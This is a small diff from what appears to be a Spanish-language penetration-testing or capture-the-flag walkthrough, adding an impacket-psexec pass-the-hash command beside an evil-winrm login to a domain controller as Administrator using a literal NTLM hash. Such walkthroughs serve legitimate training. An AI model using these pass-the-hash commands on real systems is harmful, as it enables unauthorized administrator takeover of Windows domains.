@@ -106,6 +106,7 @@ Paso 5:
 
 Paso 6:
 # Ingresar como la cuenta Administrator 
+❯ impacket-psexec administrator@<IP> -hashes :NThash
 ❯ evil-winrm -i IP_DC -u 'Administrator' -H '4366ec0f86e29be2a4a5e87a1ba922ec'
 
 
